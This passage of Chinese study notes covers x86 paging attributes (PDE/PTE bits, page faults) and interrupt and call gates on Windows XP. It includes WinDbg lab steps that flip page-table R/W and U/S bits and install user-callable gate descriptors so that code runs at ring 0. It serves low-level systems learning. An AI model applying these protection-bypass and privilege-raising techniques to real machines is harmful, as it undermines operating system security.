ds:[0],12345678cpu执行这行指令时如何判断这个地址可不可写？先用段的机制检查，ds的Attribute可读，ok没问题算线性地址,ds.base+0，为0。然后拆，10-10-12，肯定能算到一个物理页，无论线性地址为多少。得到物理页必须经过PTE，PTE中的两个属性决定了这个物理页能不能读，能不能写。拓展：通过拆分线性地址0，10-10-12，找到了这个物理页，得知这个物理页不能读也不能写，那么这整一个物理页都不能读不能写。一个物理页的属性是一样的。不会出现在同一个物理页中，上面可读不可写，下面可读可写。已知线性地址0对应的物业页可读不可写，那么就知道对应的线性地址0~fff都可读不可写。（前20位一样，在同一个物理页上）。"},{"title":"PDE、PTE属性","path":"/wiki/Protected_Mode/PDE、PTE属性.html","content":"PDE、PTE属性 物理页的属性由PDE和PTE共同决定，物理页的属性=PDE属性&amp;PTE属性。 高20位，物理地址，12位，属性。 是物理地址，想想之前在windbg根据CR3+10*4，得到PDE后，还是用!dd指令查，!dd查的就是物理地址。 PDE PTE后12位（二进制位，3个16进制位）存储着属性，两者的属性字段和属性值很多都是一样的。重复的属性字段，要进行与操作，两者都为1，对应物理页的该属性才为1。 为什么没有可执行属性的位？ 设计问题，在2-9-9-12分页补上了这个缺陷。 P位 有效位，表示PDE或PTE是否有效。 值 含义 1 有效 0 无效 为1，物理页就存在。为0，物理页不存在。 R/W位 读写位。只有当PDE和PTE的R/W位都为1的时候，该物理页才是可读可写的。只要有一个为0代表只读不可写。 值 含义 1 可读可写 0 只读不可写 对于非VT而言，一块内存申请出来，它必然是可读的。 实验：定义一个只读类型的变量，用另一个线性地址指向相同的物理页，通过修改PDE/PTE属性，实现可写。测试代码正常执行getchar时修改R/W位12345678910111213141516171819#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123;\tchar* str = &quot;Hello World&quot;; //常量区，只读不能写\tDWORD dwVal = (DWORD)str; printf(&quot;线性地址:%x &quot;,str); //修改R/W位，改为可写\tgetchar(); //str[1]=&#x27;M&#x27;;\t*(char*)dwVal = &#x27;M&#x27;;\tprintf(&quot;修改后的字符串：%s &quot;,str);\treturn 0;&#125;str这个字符串存储在PE的常量区中，只读不可写。直接执行会报错的，0xC0000005，Access Violation。但是如果我们更改物理页对应的PDE和PTE的R/W属性后，就可以成功改写。1! process 0 0CR3是19b890001234线性地址423044拆分0000 0000 01 //10 ;1*4=400 0010 0011,23 //10 ;23*4=8C044 //12123!dd 19b89000+4!dd 19d5d000+8C!ed 19d5d08c 19df4027回到虚拟机后，回车，修改成功 U/S位 user，system 特权等级位。 类别 几环 可以访问 系统环 0 1 2 系统页和用户页 用户环 3 用户页 0环是特权级环，1、2环虽然不是特权级环，但是是系统环，所以可以访问系统页和用户页。 值 含义 1 普通用户即可访问，即3环权限 0 只允许特权用户（super user）访问，即非3环权限 在应用层写代码无法访问8开头内存地址（2G以上）的原因： U/S位设置问题，如果将内核的某个页设置为1就可以在R3访问了。 windows操作系统启动时一般这么设置： 0-7FFFFFFF U/S=1（这个区域还有两段空白区，先简单这么理解） 80000000-FFFFFFFF U/S=0 实验：修改一个高2G线性地址的PDE/PTE属性,实现Ring3可读。比如:0x8003F00C代码执行修改U/S位后执行123456789101112#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;\tPDWORD p = (PDWORD)0x8003F00C;\tgetchar();\tprintf(&quot;读高2G地址0x8003F00C：%x &quot;,*p);\treturn 0;&#125;直接执行报错，0xC0000005，Access Violation。运行，getchar停住后。windbg下断，改U/S位1bf1e0001234线性地址8003F00C拆分1000000000,200 //10 ;200*4=8000000111111,3F //10 ;3F*4=FC00C //1212345! process 0 0!dd 1bf1e000+800!ed 1bf1e800 0003b167!dd 0003b000+FC!ed 3b0fc 0003f167 PS位（PageSize） 这个位只对PDE有意义。 值 含义 1 PDE直接指向物理页，不再指向PTE。线性地址低22位是页内偏移，它的大小为4MB，俗称“大页”。 0 4KB小页， PDE=1时，PDE前20位（二进制数，5位十六进制）就是物理页地址，线性地址低22位就是偏移。 实验：以0x8043f00c为例，分析PS=1的情况。随便开个进程，比如notepad，windbg下断，查CR312线性地址8043f00c拆分1000000001,201 //10 ;201*4=804查到的PDE是004001e3，PS位为1。所以线性地址低22位是物理页偏移e3：1110 0011PS0APCDPWTU/SR/WP11100011PS=1，大页A=1，被访问过被写过？全局？U/S=0，仅系统用户可访问R/W=1，可读可写P=1，有效保护模式篇——PAE分页-羽夏的博客-习题31000011111100C,3F00C //22 ;物理页偏移 A位（Access） 是否被访问（读或者写）过，如果被访问过则置1。 哪怕是1个字节的地方访问也会将对应PDE、PTE的A位置1 值 含义 1 访问过 0 未访问过 D位（Dirty） 脏位，是否被写过。 值 含义 1 被写过 0 没有被写过 9、10、11位 CPU未定义，留给操作系统用。操作系统用在什么地方了呢？内存管理缺页异常时用到。 从CPU的角度看，只要访问PDE、PTE时，P位为0，就走IDT表的e号中断缺页异常。缺页异常的处理函数，具体处理细节，由操作系统决定，处理细节对CPU透明。 在缺页异常的处理函数中，操作系统需要判断当前发现缺页后具体是什么情况，然后在做出不同的处理方式。如下图所示，有4种情况。 a. 当前线性地址有效，只不过没有物理页，内容在文件中。 **情景：**假设现有一个进程A，在线性地址00401234处存了个值10，这个进程在运行中。由于物理内存的紧张，操作系统会将使用频率低的页中的数据存到磁盘的文件中，然后将该物理页给那些现在急需物理页的进程使用。 **具体过程：*操作系统将10这个值，存到文件中，修改PTE的31:12页面文件偏移和4:1PFN，这两个字段一起标记了从物理页换出写到硬盘文件中的文件索引。P位置0。（因为物理页拿给别的进程使用了，如果原来的PTE的P位还是1，当CPU再次访问线性地址00401234时，这时PTE指向的是别人进程的物理页了）。 判断哪个页使用频率高，哪个页使用频率低，这方面是页面置换算法的内容。 当CPU通过线性地址00401234，拆分，查到PTE的P位为0时，走e号缺页中断，在函数中操作系统看到此时的PTE字段符合（a）这种情况，就知道，当前线性地址有效，只不过没有物理页，内容在文件中。 **处理方法：**接下来挂物理页，查系统文件，再将文件中的10写到物理页上。 CPU没啥感觉，仍然把10给读出来了 。（所以说处理过程对CPU透明） b. 线性地址有效，只不过还没分物理页 当CPU通过线性地址00401234，拆分，查到PTE的P位为0时，走e号缺页中断，在函数中操作系统看到此时的PTE字段符合（b）这种情况，就知道，当前线性地址有效，只不过还没分配物理页。 **处理方法：**接下来挂物理页。 c. 正在往文件中写 当CPU通过线性地址00401234，拆分，查到PTE的P位为0时，走e号缺页中断，在函数中操作系统看到此时的PTE字段符合（c）这种情况，就知道，当前物理页的内容正在往文件中写。 d. 两种情况，需要再作判断 当CPU通过线性地址00401234，拆分，查到PTE的P位为0时，走e号缺页中断，在函数中操作系统看到此时的PTE字段符合（d）这种情况（字段全是0），此时有两种可能： 当前线性地址分配了物理页，但还没有挂 访问的线性地址无效 如果确定是两种情况中的哪种？查VAD结构体。VAD在EPROCESS结构体里，它以二叉树的形式记录了当前进程用户空间分配的所有线性地址占用情况，比如1000-2000，4000-5000已分配。 **处理方法：**查VAD，如果发现访问的线性地址是无效的，报错0xC0000005。如果是还没挂物理页的情况，就挂物理页，然后正常访问。 不需要再深入细扣每一位的作用。有兴趣，参考书籍：潘爱民的书《内核原理实现》、毛德操《内核情景分析》。 问：老师PDE ps=1 P=0线性地址有效也是这样处理的吗 答：高2G没有大页，系统里经常使用的才会用大页 （没整明白，系统具体指啥？算了，就是大页不常用的意思吧） G位 学完控制寄存器与TLB才能讲此处略过。。。 全局页，指的是页，PTE有G位。 或者PDE的PS=1，此时PDE指向大页，此时PDE的G位才有意义。 PDE，PS=0，此时G位没意义。 PWT位 学完控制寄存器与TLB才能讲此处略过。。。 PCD位 学完控制寄存器与TLB才能讲此处略过。。。 思考题 一个线性地址如果可以访问，一定要填上正确的PDE和PTE,但PDE与PTE是物理地址，如果我们想填充，那又必须要通过线性地址才能去访问,谁为访问PDE与PTE的线性地址填充争取的PDE与PTE呢? 解释： 我现在是操作系统，用VirtualAlloc函数申请内存地址12345000，为了使线性地址12345000能用，就要给这个线性地址挂上物理页，即填充有效的PDE和PTE。PDE在PDT上，PTE在PTT上，PDT和PTT都是物理地址。那么，怎么找到PDT，填上PDE？怎么找到PTT，填上PTE？ 有人肯定拿CR3说事，说CR3存了PDT的地址。但这存的是物理地址，CPU可以访问物理地址，但代码中出现的地址只能是线性地址。 课后练习 创建2个进程,以页为单位拆分0-4G线性地址。 题目设计意图： 线性地址与物理地址之间的关系 任何一个进程的线性地址，哪里是使用了的，哪里是没用了的，哪里和别的进程不一样、哪里一样 （⭐）哪个线性地址刚好对应PDT和PTT 拆完的发现低2G (0-7FFFFFFF）几乎不同高2G (80000000 - FFFFFFFF)几乎相同，高两2G中有一些大页，即4MB页一个进程低2G的内存空间0-7FFFFFFF的前64K和后64k都是没有映射的（线性地址0-00010000与7FFF0000-7FFFFFFF）"},{"title":"中断门","path":"/wiki/Protected_Mode/中断门.html","content":"IDT表 IDT（Interrupt Descriptor Table）表，中断描述符表，表中保存的是和中断处理过程有关的描述符。同GDT表一样，IDT也是由一系列描述符组成，每个描述符占8个字节。IDT表与GDT表不同，第一个元素不为NULL。 使用r idtr读取IDT表基址，r idtl读取IDT表的长度。 xp系统中看一下下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133kd&gt; r idtridtr=8003f400kd&gt; r idtlidtl=000007ffkd&gt; dq 8003f400 L0x1008003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000 00000000`000800008003f510 00000000`00080000 00000000`000800008003f520 00000000`00080000 00000000`000800008003f530 00000000`00080000 00000000`000800008003f540 00000000`00080000 00000000`000800008003f550 8053ee00`0008e9de 8053ee00`0008eae08003f560 8053ee00`0008ec80 8053ee00`0008f5c08003f570 8053ee00`0008e481 80548e00`000817808003f580 80538e00`0008db40 80538e00`0008db4a8003f590 80538e00`0008db54 80538e00`0008db5e8003f5a0 80538e00`0008db68 80538e00`0008db728003f5b0 80538e00`0008db7c 806d8e00`000827288003f5c0 80538e00`0008db90 80538e00`0008db9a8003f5d0 80538e00`0008dba4 80538e00`0008dbae8003f5e0 80538e00`0008dbb8 806d8e00`00083b708003f5f0 80538e00`0008dbcc 80538e00`0008dbd68003f600 80538e00`0008dbe0 806d8e00`000839cc8003f610 80538e00`0008dbf4 80538e00`0008dbfe8003f620 80538e00`0008dc08 80538e00`0008dc128003f630 80538e00`0008dc1c 80538e00`0008dc268003f640 80538e00`0008dc30 80538e00`0008dc3a8003f650 80538e00`0008dc44 80538e00`0008dc4e8003f660 80538e00`0008dc58 80538e00`0008dc628003f670 80538e00`0008dc6c 80538e00`0008dc768003f680 806d8e00`00082800 80538e00`0008dc8a8003f690 80538e00`0008dc94 80538e00`0008dc9e8003f6a0 80538e00`0008dca8 80538e00`0008dcb28003f6b0 80538e00`0008dcbc 80538e00`0008dcc68003f6c0 80538e00`0008dcd0 80538e00`0008dcda8003f6d0 80538e00`0008dce4 80538e00`0008dcee8003f6e0 80538e00`0008dcf8 80538e00`0008dd028003f6f0 80538e00`0008dd0c 80538e00`0008dd168003f700 80538e00`0008dd20 80538e00`0008dd2a8003f710 861f8e00`0008f044 86218e00`0008589c8003f720 80538e00`0008dd48 80538e00`0008dd528003f730 80538e00`0008dd5c 80538e00`0008dd668003f740 80538e00`0008dd70 80538e00`0008dd7a8003f750 80538e00`0008dd84 80538e00`0008dd8e8003f760 80538e00`0008dd98 80538e00`0008dda28003f770 80538e00`0008ddac 80538e00`0008ddb68003f780 80538e00`0008ddc0 80538e00`0008ddca8003f790 80538e00`0008ddd4 86078e00`0008edd48003f7a0 80538e00`0008dde8 80538e00`0008ddf28003f7b0 80538e00`0008ddfc 80538e00`0008de068003f7c0 80538e00`0008de10 80538e00`0008de1a8003f7d0 80538e00`0008de24 80538e00`0008de2e8003f7e0 80538e00`0008de38 80538e00`0008de428003f7f0 80538e00`0008de4c 80538e00`0008de568003f800 80538e00`0008de60 80538e00`0008de6a8003f810 86028e00`0008db3c 86398e00`00088c3c8003f820 80538e00`0008de88 80538e00`0008de928003f830 80538e00`0008de9c 80538e00`0008dea68003f840 80538e00`0008deb0 80538e00`0008deba8003f850 80538e00`0008dec4 80538e00`0008dece8003f860 80538e00`0008ded8 80538e00`0008dee28003f870 80538e00`0008deec 80538e00`0008def68003f880 80538e00`0008df00 80538e00`0008df0a8003f890 86188e00`000892f4 86208e00`000856648003f8a0 80538e00`0008df28 80538e00`0008df328003f8b0 80538e00`0008df3c 80538e00`0008df468003f8c0 80538e00`0008df50 80538e00`0008df5a8003f8d0 80538e00`0008df64 80538e00`0008df6e8003f8e0 80538e00`0008df78 80538e00`0008df828003f8f0 80538e00`0008df8c 80538e00`0008df968003f900 80538e00`0008dfa0 80538e00`0008dfaa8003f910 80538e00`0008dfb4 86258e00`000808948003f920 80538e00`0008dfc8 80538e00`0008dfd28003f930 80538e00`0008dfdc 80538e00`0008dfe68003f940 80538e00`0008dff0 80538e00`0008dffa8003f950 80538e00`0008e004 80538e00`0008e00e8003f960 80538e00`0008e018 80538e00`0008e0228003f970 80538e00`0008e02c 80538e00`0008e0368003f980 80538e00`0008e040 86328e00`000854ec8003f990 80538e00`0008e054 80538e00`0008e05e8003f9a0 86218e00`00082424 80538e00`0008e0728003f9b0 80538e00`0008e07c 80538e00`0008e0868003f9c0 80538e00`0008e090 80538e00`0008e09a8003f9d0 80538e00`0008e0a4 80538e00`0008e0ae8003f9e0 80538e00`0008e0b8 80538e00`0008e0c28003f9f0 80538e00`0008e0cc 80538e00`0008e0d68003fa00 80538e00`0008e0e0 806d8e00`000829848003fa10 80538e00`0008e0f4 80538e00`0008e0fe8003fa20 80538e00`0008e108 80538e00`0008e1128003fa30 80538e00`0008e11c 80538e00`0008e1268003fa40 80538e00`0008e130 80538e00`0008e13a8003fa50 80538e00`0008e144 80538e00`0008e14e8003fa60 80538e00`0008e158 80538e00`0008e1628003fa70 80538e00`0008e16c 80538e00`0008e1768003fa80 80538e00`0008e180 806d8e00`00081d348003fa90 80538e00`0008e194 80538e00`0008e19e8003faa0 80538e00`0008e1a8 80538e00`0008e1b28003fab0 80538e00`0008e1bc 80538e00`0008e1c68003fac0 80538e00`0008e1d0 80538e00`0008e1da8003fad0 80538e00`0008e1e4 80538e00`0008e1ee8003fae0 80538e00`0008e1f8 80538e00`0008e2028003faf0 80538e00`0008e20c 80538e00`0008e2168003fb00 80538e00`0008e220 806d8e00`00082f0c8003fb10 80538e00`0008e234 806d8e00`00082c708003fb20 80538e00`0008e248 80538e00`0008e2528003fb30 80538e00`0008e25c 80538e00`0008e2668003fb40 80538e00`0008e270 80538e00`0008e27a8003fb50 80538e00`0008e284 80538e00`0008e28e8003fb60 80538e00`0008e298 80538e00`0008e2a28003fb70 80538e00`0008e2a9 80538e00`0008e2b08003fb80 80538e00`0008e2b7 80538e00`0008e2be8003fb90 80538e00`0008e2c5 80538e00`0008e2cc8003fba0 80538e00`0008e2d3 80538e00`0008e2da8003fbb0 80538e00`0008e2e1 80538e00`0008e2e88003fbc0 80538e00`0008e2ef 80538e00`0008e2f68003fbd0 80538e00`0008e2fd 80538e00`0008e3048003fbe0 80538e00`0008e30b 806d8e00`000834648003fbf0 806d8e00`00083604 80538e00`0008e320 在32位系统中，每个中断描述符的大小是8字节。所以，要计算IDT中有多少个描述符，你需要把IDTL的值加1（因为从0开始计数），然后除以每个描述符的大小。 0x7ff (IDTL的值) + 1 = 0x800 0x800 (这是以字节为单位的总长度) / 8 (每个描述符的大小，以字节为单位) = 0x100 所以你的IDT应该包含0x100或者十进制的256个描述符。 IDT表中包含3种门描述符： 任务门描述符 中断门描述符 陷阱门描述符 均用于控制转移。 中断门描述符 结构图 中断门描述符也是段描述符的一种，所以遵循段描述符的字段结构。中断门描述符的结构可以通过调用门结构来进行类比学习，在中断门中，调用门用来写参数数目的位被清空，因为中断门无法传参。中断门，Type域和调用门有些不一样，其他一样。 图中的D位： D位的值 含义 0 16位中断门 1 32位中断门 用途 中断门用途： 系统调用 调试 老的CPU，3环API通过中断门进0环，新的CPU用的快速调用。 Windows中的提权方式并未使用调用门，而是使用了中断门。 断电走2号中断（IDT第三个）（int 2）：电脑电源突然被拔了，走2号中断，处理收尾工作。 双重错误走8号中断：假设我走了INT 2中断，但是在中断里又出错了，此时走双重错误8号中断。 INT 2:8053ee00`0008f6e4，中断门 int 3:8053ee00`0008f864，中断门 int 8:00008500`00501198 123456kd&gt; dq 8003f400 L228003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c0 下面表int 3类型写的陷阱门。但是上面我查表看的是中断门。而且，看完整个IDT表，windows是没使用陷阱门的。 和调用门的区别 区别 调用门 中断门 调用指令 CALL FAR指令 INT指令 指令分析 CALL CS:EIP中的CS是段选择子，由3部分组成 INT N指令中的N只是索引 查的表 GDT表 IDT表 参数 可以带参数 无法带参数 权限检查 检查RPL和CPL 只检查CPL 中断门执行流程 指令格式： 1INT N (N为中断门索引号) 其中，N是索引，N*8+IDT的基址，就是具体的中断门描述符 执行步骤： 堆栈变化（相比于调用门，中断门的压栈数据多了一个EFLAG寄存器） 在没有权限切换时，会向堆栈依次压入EFLAG、CS和EIP； 如果有权限切换，会向堆栈依次压入SS、ESP、EFLAG、CS和EIP。 CPU会索引到IDT表。后面的N表示查IDT表项的下标。对比调用门，中断门没有了RPL，故CPU只会校验CPL。 在中断门中,不能通过RETF返回，而应该通过IRET/IRETD指令返回。（因为压了RFLAGA寄存器）。 会压入EFLAG寄存器的原因：EFLAG寄存器中有一个IF（Interupt Enable Flag）位，中断使能标志。用来决定CPU 是否响应CPU外部的可屏蔽中断发出的中断请求. 当IF=1 时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求 当IF=0 时，CPU不响应CPU外部的可屏蔽中断发出的中断请求 IF标志对不可屏蔽中断没有影响。 可屏蔽中断请求：如键盘输入，鼠标点击都是一次可屏蔽中断请求。 不可屏蔽中断请求：CPU必须立即无条件响应的请求，如电源断电，CPU必须无条件响应。实际上，断电后CPU有电容，这点电量还能跑一会，用来做关机的保存工作。这个中断是2号中断，INT 2。 在进入一个中断后会将IF位置0，屏蔽其他中断。 IF位，第9位，从右往左数，第10个 iret和iretd指令区别 chatGPT: IRET 和 IRETD 都是 x86 汇编语言中用于从中断或者异常返回的指令。它们的主要任务是从堆栈中恢复处理器状态，包括指令指针，代码段选择子和标志寄存器的值。 在 16 位和 32 位的实模式下，IRET 是用于从中断或异常返回的标准指令。 在 32 位的保护模式下，你可能会看到 IRETD 指令，它指的是 “interrupt return double”，这里的 “double” 表示的是数据宽度，因为在 32 位模式下，返回地址，段寄存器，标志寄存器的值都是双字的。 然而，很多汇编器会将 IRET 和 IRETD 当作同一指令处理，在32位模式下当作 IRETD，在16位模式下当作 IRET，这意味着在实践中，两者的使用可能是可以互换的，具体取决于你的汇编器是如何处理这些指令的。 在64位的模式下，使用 IRETQ (interrupt return quadword) 来处理返回中断或者异常。 总的来说，IRET 和 IRETD 的区别主要取决于你正在使用的处理器模式和你的汇编器如何解释这些指令。 网上的Blog 该链接的练习4：https://www.cnblogs.com/wingsummer/p/15353642.html iretd比iret多一个前缀指令0x66。这样的话，在32位系统下默认寻址32位，如果是iret指令，就是16位寻址。 实验 构造中断门，实现提权后读取高2G的地址并分析堆栈情况 在调用门中实现使用IRETD返回，在中断门中实现用RETF返回 自行构造中断门 补充知识：SIDT指令在x86汇编指令集中，SIDT指令可以用来读取中断描述符表（IDT，Interrupt Descriptor Table）的基址和限值。语法如下：1SIDT destination其中，destination可以是内存位置或寄存器。这个指令将IDTR（IDT Register）中的内容存储到指定的destination中。IDTR寄存器中包含了IDT的基址和限值。但是我试了不知道为啥不行，编译没问题，Link时会报错：123456--------------------Configuration: MyInterruptGate - Win32 Debug--------------------Linking...LINK : fatal error LNK1168: cannot open Debug/MyInterruptGate.exe for writing执行 link.exe 时出错.MyInterruptGate.exe - 1 error(s), 0 warning(s)测试代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE IDT[6]=&#123;0&#125;;DWORD dwH2GValue;// //切换堆栈后执行的代码// void __declspec(naked) R0Func() //00401030 // &#123;// __asm// &#123;// //int 3 //让断点停在windbg，让我们分析下寄存器和堆栈// pushad// pushfd// mov eax,0x8003f400 //读取高2G的地址，地址是IDT表基址// mov ebx,[eax]// mov dwH2GValue,ebx// sidt IDT //读IDTR寄存器// popfd// popad// iretd// &#125;// &#125;void PrintRegister()&#123; DWORD IDT_ADDR=*(PDWORD)(&amp;IDT[2]); //IDT表大小 WORD IDT_LIMIT=*(PWORD)(&amp;IDT[0]); //IDT表基址 printf(&quot;%x %x %x &quot;,dwH2GValue,IDT_ADDR,IDT_LIMIT);&#125;int main()&#123; __asm &#123; // int 0x20 //索引号32，8003f500 sidt idt &#125; PrintRegister(); getchar(); return 0;&#125; 实验过程构造中断门描述符测试代码构造的中断门描述符DPL为3，运行结果构造的中断门描述符DPL为0，运行结果构造的门描述符（DPL=3）：0040EE00`00081020构造的门描述符（DPL=0）：00408E00`00081020必须的：P=1，S=0，D=1，表32位。0~7都为0。构造的：Offset：00401020，DPL=11段选择子：0008，0环代码段0000 0000 0000 1 0 00，，Index为1序号地址段描述符数据段or代码段DPL18003f00800cf9b00`0000ffff代码段00改8003f500这个P位为0的无效段描述符，Index是32，0x201234567891011121314151617181920212223242526272829303132333435363738kd&gt; dq 8003f400 L228003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000 00000000`00080000kd&gt; eq 8003f500 0040EE00`00081020kd&gt; dq 8003f400 L228003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 0040ee00`00081020 00000000`00080000kd&gt; g代码作用：通过中断门进0环，在0环里读高两2G的地址（IDT表的第一项）123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE IDTItem[8]=&#123;0&#125;;//切换堆栈后执行的代码void __declspec(naked) R0Func() //00401020 &#123; __asm &#123; //int 3 //让断点停在windbg，让我们分析下寄存器和堆栈 pushad pushfd mov eax,0x8003f400 //读取高2G的地址，地址是IDT表基址 mov ebx,[eax] mov dword ptr ds:[IDTItem],ebx //IDT表第一个元素的低32位（小端序） mov ecx,[eax+0x4] mov dword ptr ds:[IDTItem+0x4],ecx //IDT表第一个元素的高32位（小端序） popfd popad iretd //iret会蓝屏，因为iret的硬编码是66CF，32位下应该使用iretd，硬编码是C &#125;&#125;int main()&#123; __asm &#123; int 0x20 //索引号32，8003f500 &#125; printf(&quot;%08x`%08x &quot;,*(PDWORD)((PBYTE)IDTItem+0x4),*(PDWORD)IDTItem);//处理成：按windbg的dq那样显示数据 getchar(); return 0;&#125;08表示输出宽度为8位，如果不足8位会自动补齐0。堆栈分析测试代码调用中断门前的寄存器调用后在0环时的寄存器分析1int a=1; //为了在3环下断点加的这行1int 3 //让断点停在windbg，让我们分析下寄存器和堆栈123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE IDTItem[8]=&#123;0&#125;;//切换堆栈后执行的代码void __declspec(naked) R0Func() //00401020 &#123; __asm &#123; //int 3 //让断点停在windbg，让我们分析下寄存器和堆栈 pushad pushfd mov eax,0x8003f400 //读取高2G的地址，地址是IDT表基址 mov ebx,[eax] mov dword ptr ds:[IDTItem],ebx //IDT表第一个元素的低32位（小端序） mov ecx,[eax+0x4] mov dword ptr ds:[IDTItem+0x4],ecx //IDT表第一个元素的高32位（小端序） popfd popad iretd //iret会蓝屏，因为iret的硬编码是66CF，32位下应该使用iretd，硬编码是C &#125;&#125;int main()&#123; __asm &#123; int 0x20 //索引号32，8003f500 0040EE00`00081020 &#125; printf(&quot;%08x`%08x &quot;,*(PDWORD)((PBYTE)IDTItem+0x4),*(PDWORD)IDTItem);//处理成：按windbg的dq那样显示数据 getchar(); return 0;&#125;F5调试，断在int a那行，看寄存器。然后F11步进，断在windbg里，看寄存器EFL=00000212，IF=1Efl=12，IF=0了 调用门使用IRETD返回，中断门使用RETF返回 思考tips堆栈变化（左-&gt;右，栈顶-&gt;栈底）返回使用的指令短调用CSret调用门（跨段不提权）EIP,CS长返回指令retf调用门（跨段并提权），无参EIP,CS,ESP,SSretf调用门（跨段并提权），带参EIP,CS,参数1,参数2,…,ESP,SSretf中断门（无权限切换）EIP,CS,EFLAGiret,iretd中断门（有权限切换）EIP,CS,EFLAG,ESP,SSiret,iretd核心要点都是要在使用返回指令前修改堆栈，但在具体修改方式上有不同的选择 知识温故栈顶指针指向问题：32位入栈操作把栈顶指针减4，再将数值复制到栈顶指针指向的堆栈位置。出栈操作时从堆栈删除数据，数值弹栈后，再将栈顶指针增加（按堆栈元素大小），指向堆栈中下一个最高位置。pushad和pushfd指令：pushfd指令是把32位EFLAGS寄存器内容压入堆栈，popfd指令把堆栈单元内容弹出到EFLAGES寄存器。pushad指令是将所有32位通用寄存器压入堆栈，顺序是eax，ecx，edx，ebx，esp，ebp，esi和edi的顺序。popad指令按相反顺序将寄存器弹出堆栈。0x24：十六进制36，因为pushfd会将8个32位寄存器压入堆栈中，即32个字节。pushfd将EFLAG寄存器压入堆栈中，也是4个字节，总和即为36个字节。 调用门使用IRETD返回 实现过程做法1：使用有参调用门实现，传的参数是eflags参考：https://blog.csdn.net/yu_sn0w/article/details/108881202测试代码构造的门描述符执行结果堆栈分析123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;windows.h&gt;char CallGate[6] = &#123;0, 0, 0, 0, 0x48, 0&#125;;//8003f048 0040EC01`00081020DWORD dwH2GValue;//切换堆栈后执行的代码void __declspec(naked) R0Func() //00401020&#123; __asm &#123; //int 3 //windbg调试用 pushad pushfd mov eax,0x8003f00c //读取高2G的地址 mov ebx,[eax] mov dwH2GValue,ebx popfd popad iretd &#125;&#125;int main()&#123; __asm &#123; pushfd call fword ptr ds:[CallGate]; //长调用，需要6个字节。F10步进，然后在windbg，u查看后面的指令，p单条指令执行 add esp,4 //前边压栈了，手动平栈 &#125; printf(&quot;Call gate successfully returned using iretd &quot;); printf(&quot;%x &quot;,dwH2GValue); return 0;&#125;有参调用门（跨段并提权）堆栈变化：EIP,CS,参数1,参数2,…,ESP,SS，中断门（有权限切换）堆栈变化：EIP,CS,EFLAG,ESP,SS，所以用带1个参数的调用门，call后，就能使用iretd返回了。0040EC01`000810201234567891011121314kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0040EC01`00081020kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0040ec01`00081020kd&gt; 